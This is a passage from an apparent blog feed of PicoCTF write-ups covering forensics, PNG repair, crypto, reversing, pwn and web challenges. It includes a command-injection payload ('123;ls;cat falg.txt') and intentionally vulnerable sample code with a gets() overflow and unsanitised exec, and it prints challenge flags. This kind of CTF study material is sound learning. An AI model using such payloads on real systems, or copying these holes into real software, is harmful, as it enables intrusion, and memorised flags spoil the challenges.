It said &lt;code>notaflag{sorry}&lt;/code>, means we need to recover other parts.&lt;/p></description></item><item><title>PicoCTF - `Wireshark doo dooo do doo...`</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../</guid><description>&lt;h1 id="picoctf---wireshark-doo-dooo-do-doo">
 PicoCTF - &lt;code>Wireshark doo dooo do doo...&lt;/code>
 &lt;a class="anchor" href="#picoctf---wireshark-doo-dooo-do-doo">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/115?category=4&amp;amp;page=1">https://play.picoctf.org/practice/challenge/115?category=4&amp;page=1&lt;/a>&lt;/p>
&lt;h2 id="exploit---strings--rot13">
 Exploit - strings + rot13
 &lt;a class="anchor" href="#exploit---strings--rot13">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings shark1.pcapng | grep &amp;#34;{&amp;#34;
...
Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}
...
&lt;/code>&lt;/pre>&lt;p>Obviously a encrypted flag $\to$ use rot13
flag: &lt;code>picoCTF{p33kab00_1_s33_u_deadbeef}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - advanced-potion-making</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/</guid><description>&lt;h1 id="picoctf---advanced-potion-making">
 PicoCTF - advanced-potion-making
 &lt;a class="anchor" href="#picoctf---advanced-potion-making">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/205?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">advanced-potion-making&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.mythsman.com/post/5d2d62b4a2005d74040ef7eb/">PNG文件格式详解&lt;/a>
&lt;a href="https://zhuanlan.zhihu.com/p/599657891">隐写分析(2) PNG图片隐写&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover--stegsolve">
 Exploit - Recover + StegSolve
 &lt;a class="anchor" href="#exploit---recover--stegsolve">#&lt;/a>
&lt;/h2>
&lt;p>Modify the file signature and length to the right value.
&lt;code>89 50 42 11 0D 0A 1A 0A 00 12 13 14 49 48 44 52&lt;/code>
$\to$
&lt;code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;img src="https://i.imgur.com/Pv1ojSN.png" alt="" />&lt;/li>
&lt;li>&lt;img src="https://i.imgur.com/vLgguSp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://i.imgur.com/ZT4PsQ5.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - AES-ABC</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/</guid><description>&lt;h1 id="picoctf---aes-abc">
 PicoCTF - AES-ABC
 &lt;a class="anchor" href="#picoctf---aes-abc">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.adobe.com/tw/creativecloud/file-types/image/raster/ppm-file.html">What is PPM file?&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python

from Crypto.Cipher import AES
from key import KEY
import os
import math

BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))


def to_bytes(n):
 s = hex(n)
 s_n = s[2:]
 if &amp;#39;L&amp;#39; in s_n:
 s_n = s_n.replace(&amp;#39;L&amp;#39;, &amp;#39;&amp;#39;)
 if len(s_n) % 2 != 0:
 s_n = &amp;#39;0&amp;#39; + s_n
 decoded = s_n.decode(&amp;#39;hex&amp;#39;)

 pad = (len(decoded) % BLOCK_SIZE)
 if pad != 0: 
 decoded = &amp;#34;\0&amp;#34; * (BLOCK_SIZE - pad) + decoded
 return decoded


def remove_line(s):
 # returns the header line, and the rest of the file
 return s[:s.index(&amp;#39;\n&amp;#39;) + 1], s[s.index(&amp;#39;\n&amp;#39;)+1:]


def parse_header_ppm(f):
 data = f.read()

 header = &amp;#34;&amp;#34;

 for i in range(3):
 header_i, data = remove_line(data)
 header += header_i

 return header, data
 

def pad(pt):
 padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE
 return pt + (chr(padding) * padding)


def aes_abc_encrypt(pt):
 cipher = AES.new(KEY, AES.MODE_ECB)
 ct = cipher.encrypt(pad(pt))

 blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
 iv = os.urandom(16)
 blocks.insert(0, iv)
 
 for i in range(len(blocks) - 1):
 prev_blk = int(blocks[i].encode(&amp;#39;hex&amp;#39;), 16)
 curr_blk = int(blocks[i+1].encode(&amp;#39;hex&amp;#39;), 16)

 n_curr_blk = (prev_blk + curr_blk) % UMAX
 blocks[i+1] = to_bytes(n_curr_blk)

 ct_abc = &amp;#34;&amp;#34;.join(blocks)
 
 return iv, ct_abc, ct


if __name__==&amp;#34;__main__&amp;#34;:
 with open(&amp;#39;flag.ppm&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 header, data = parse_header_ppm(f)
 
 iv, c_img, ct = aes_abc_encrypt(data)

 with open(&amp;#39;body.enc.ppm&amp;#39;, &amp;#39;wb&amp;#39;) as fw:
 fw.write(header)
 fw.write(c_img)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - ARMssembly 0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---armssembly-0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---armssembly-0/</guid><description>&lt;h1 id="picoctf---armssembly-0">
 PicoCTF - ARMssembly 0
 &lt;a class="anchor" href="#picoctf---armssembly-0">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler ARM assembly code&lt;/p>
&lt;pre tabindex="0">&lt;code>	.arch armv8-a
	.file	&amp;#34;chall.c&amp;#34;
	.text
	.align	2
	.global	func1
	.type	func1, %function
func1:
	sub	sp, sp, #16
	str	w0, [sp, 12]
	str	w1, [sp, 8]
	ldr	w1, [sp, 12]
	ldr	w0, [sp, 8]
	cmp	w1, w0
	bls	.L2
	ldr	w0, [sp, 12]
	b	.L3
.L2:
	ldr	w0, [sp, 8]
.L3:
	add	sp, sp, 16
	ret
	.size	func1, .-func1
	.section	.rodata
	.align	3
.LC0:
	.string	&amp;#34;Result: %ld\n&amp;#34;
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	str	x19, [sp, 16]
	str	w0, [x29, 44]
	str	x1, [x29, 32]
	ldr	x0, [x29, 32]
	add	x0, x0, 8
	ldr	x0, [x0]
	bl	atoi
	mov	w19, w0
	ldr	x0, [x29, 32]
	add	x0, x0, 16
	ldr	x0, [x0]
	bl	atoi
	mov	w1, w0
	mov	w0, w19
	bl	func1
	mov	w1, w0
	adrp	x0, .LC0
	add	x0, x0, :lo12:.LC0
	bl	printf
	mov	w0, 0
	ldr	x19, [sp, 16]
	ldp	x29, x30, [sp], 48
	ret
	.size	main, .-main
	.ident	&amp;#34;GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0&amp;#34;
	.section	.note.GNU-stack,&amp;#34;&amp;#34;,@progbits
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - asm4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---asm4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---asm4/</guid><description>&lt;h1 id="picoctf---asm4">
 PicoCTF - asm4
 &lt;a class="anchor" href="#picoctf---asm4">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What will asm4(&amp;ldquo;picoCTF_f97bb&amp;rdquo;) return? Submit the flag as a hexadecimal value (starting with &amp;lsquo;0x&amp;rsquo;). NOTE: Your submission for this question will NOT be in the normal flag format.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">asm4:
	&amp;lt;+0&amp;gt;:	push ebp
	&amp;lt;+1&amp;gt;:	mov ebp,esp
	&amp;lt;+3&amp;gt;:	push ebx
	&amp;lt;+4&amp;gt;:	sub esp,0x10
	&amp;lt;+7&amp;gt;:	mov DWORD PTR [ebp-0x10],0x27a
	&amp;lt;+14&amp;gt;:	mov DWORD PTR [ebp-0xc],0x0
	&amp;lt;+21&amp;gt;:	jmp 0x518 &amp;lt;asm4+27&amp;gt;
	&amp;lt;+23&amp;gt;:	add DWORD PTR [ebp-0xc],0x1
	&amp;lt;+27&amp;gt;:	mov edx,DWORD PTR [ebp-0xc]
	&amp;lt;+30&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+33&amp;gt;:	add eax,edx
	&amp;lt;+35&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+38&amp;gt;:	test al,al
	&amp;lt;+40&amp;gt;:	jne 0x514 &amp;lt;asm4+23&amp;gt;
	&amp;lt;+42&amp;gt;:	mov DWORD PTR [ebp-0x8],0x1
	&amp;lt;+49&amp;gt;:	jmp 0x587 &amp;lt;asm4+138&amp;gt;
	&amp;lt;+51&amp;gt;:	mov edx,DWORD PTR [ebp-0x8]
	&amp;lt;+54&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+57&amp;gt;:	add eax,edx
	&amp;lt;+59&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+62&amp;gt;:	movsx edx,al
	&amp;lt;+65&amp;gt;:	mov eax,DWORD PTR [ebp-0x8]
	&amp;lt;+68&amp;gt;:	lea ecx,[eax-0x1]
	&amp;lt;+71&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+74&amp;gt;:	add eax,ecx
	&amp;lt;+76&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+79&amp;gt;:	movsx eax,al
	&amp;lt;+82&amp;gt;:	sub edx,eax
	&amp;lt;+84&amp;gt;:	mov eax,edx
	&amp;lt;+86&amp;gt;:	mov edx,eax
	&amp;lt;+88&amp;gt;:	mov eax,DWORD PTR [ebp-0x10]
	&amp;lt;+91&amp;gt;:	lea ebx,[edx+eax*1]
	&amp;lt;+94&amp;gt;:	mov eax,DWORD PTR [ebp-0x8]
	&amp;lt;+97&amp;gt;:	lea edx,[eax+0x1]
	&amp;lt;+100&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+103&amp;gt;:	add eax,edx
	&amp;lt;+105&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+108&amp;gt;:	movsx edx,al
	&amp;lt;+111&amp;gt;:	mov ecx,DWORD PTR [ebp-0x8]
	&amp;lt;+114&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+117&amp;gt;:	add eax,ecx
	&amp;lt;+119&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+122&amp;gt;:	movsx eax,al
	&amp;lt;+125&amp;gt;:	sub edx,eax
	&amp;lt;+127&amp;gt;:	mov eax,edx
	&amp;lt;+129&amp;gt;:	add eax,ebx
	&amp;lt;+131&amp;gt;:	mov DWORD PTR [ebp-0x10],eax
	&amp;lt;+134&amp;gt;:	add DWORD PTR [ebp-0x8],0x1
	&amp;lt;+138&amp;gt;:	mov eax,DWORD PTR [ebp-0xc]
	&amp;lt;+141&amp;gt;:	sub eax,0x1
	&amp;lt;+144&amp;gt;:	cmp DWORD PTR [ebp-0x8],eax
	&amp;lt;+147&amp;gt;:	jl 0x530 &amp;lt;asm4+51&amp;gt;
	&amp;lt;+149&amp;gt;:	mov eax,DWORD PTR [ebp-0x10]
	&amp;lt;+152&amp;gt;:	add esp,0x10
	&amp;lt;+155&amp;gt;:	pop ebx
	&amp;lt;+156&amp;gt;:	pop ebp
	&amp;lt;+157&amp;gt;:	ret 
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</guid><description>&lt;h1 id="picoctf---babygame01">
 PicoCTF - babygame01
 &lt;a class="anchor" href="#picoctf---babygame01">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you&amp;rsquo;ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227.
Hint 1: Use &amp;lsquo;w&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;rsquo;s&amp;rsquo;,&amp;rsquo;d&amp;rsquo; to move around.
Hint 2: There may be secret commands to make your life easy.&lt;/p></description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</guid><description>&lt;h1 id="picoctf---babygame02">
 PicoCTF - babygame02
 &lt;a class="anchor" href="#picoctf---babygame02">#&lt;/a>
&lt;/h1>
&lt;h2 id="source">
 Source
 &lt;a class="anchor" href="#source">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> position[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [esp+0h] [ebp-AA0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> map[&lt;span style="color:#ae81ff">2700&lt;/span>]; &lt;span style="color:#75715e">// [esp+Bh] [ebp-A95h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> input; &lt;span style="color:#75715e">// [esp+A97h] [ebp-9h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>p_argc; &lt;span style="color:#75715e">// [esp+A98h] [ebp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p_argc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>argc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_player(position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_map(map, position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> signal(&lt;span style="color:#ae81ff">2&lt;/span>, sigint_handler);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> input &lt;span style="color:#f92672">=&lt;/span> getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> move_player(position, input, map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">29&lt;/span> ); &lt;span style="color:#75715e">// y座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span> ); &lt;span style="color:#75715e">// x座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> puts(&lt;span style="color:#e6db74">&amp;#34;You win!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Win Function&lt;/p></description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</guid><description>&lt;h1 id="picoctf---buffer-overflow-2">
 PicoCTF - buffer overflow 2
 &lt;a class="anchor" href="#picoctf---buffer-overflow-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
 char buf[FLAGSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f);
 if (arg1 != 0xCAFEF00D)
 return;
 if (arg2 != 0xF00DF00D)
 return;
 printf(buf);
}

void vuln(){
 char buf[BUFSIZE];
 gets(buf);
 puts(buf);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 gid_t gid = getegid();
 setresgid(gid, gid, gid);

 puts(&amp;#34;Please enter your string: &amp;#34;);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - c0rrupt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/</guid><description>&lt;h1 id="picoctf---c0rrupt">
 PicoCTF - c0rrupt
 &lt;a class="anchor" href="#picoctf---c0rrupt">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/53?category=4&amp;amp;page=3">c0rrupt&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover-png-file">
 Exploit - Recover PNG file
 &lt;a class="anchor" href="#exploit---recover-png-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Analyze&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>Header
&lt;code>89 65 4E 34 0D 0A B0 AA&lt;/code>
$\to$
&lt;code>89 50 4E 47 0D 0A 1A 0A&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>IHDR
&lt;code>43 22 44 52&lt;/code>
$\to$
&lt;code>49 48 44 52&lt;/code>
Then use &lt;code>pngcheck&lt;/code> to analyze the file. It said the header still have some error.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck mystery
mystery CRC error in chunk pHYs (computed 38d82c82, expected 495224f0)
ERROR: mystery
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Revise &lt;code>pHYs&lt;/code>
You can open an arbitrary png file and observe &lt;code>pHYs&lt;/code> part.&lt;/p></description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
 PicoCTF - caas
 &lt;a class="anchor" href="#picoctf---caas">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const app = express();
const { exec } = require(&amp;#39;child_process&amp;#39;);

app.use(express.static(&amp;#39;public&amp;#39;));

app.get(&amp;#39;/cowsay/:message&amp;#39;, (req, res) =&amp;gt; {
 exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =&amp;gt; {
 if (error) return res.status(500).end();
 res.type(&amp;#39;txt&amp;#39;).send(stdout).end();
 });
});

app.listen(3000, () =&amp;gt; {
 console.log(&amp;#39;listening&amp;#39;);
});
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>直覺是command injection&lt;/p>
&lt;h2 id="exploit---easy-command-injection">
 Exploit - Easy Command Injection
 &lt;a class="anchor" href="#exploit---easy-command-injection">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>/cowsay/123;ls;cat falg.txt&lt;/code>
Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Compress and Attack</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/picoctf---compress-and-attack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/picoctf---compress-and-attack/</guid><description>&lt;h1 id="picoctf---compress-and-attack">
 PicoCTF - Compress and Attack
 &lt;a class="anchor" href="#picoctf---compress-and-attack">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>zlib compression property
詳細說明一下zlib的壓縮特性是當壓縮的內容出現重複字元的時候，壓縮過後的長度會不變&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; import zlib
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{picoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{tepicoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
